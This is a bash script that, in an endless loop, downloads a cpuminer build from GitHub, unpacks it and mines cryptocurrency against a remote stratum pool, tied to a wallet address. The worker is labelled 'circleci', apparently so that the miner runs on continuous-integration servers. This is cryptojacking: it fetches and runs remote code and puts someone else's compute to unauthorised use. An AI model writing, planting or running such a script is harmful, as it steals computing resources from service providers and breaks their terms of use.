#!/bin/bash

while [ 1 ]; do
  sleep 5
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
tar xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.circleci -t2
done
sleep 999

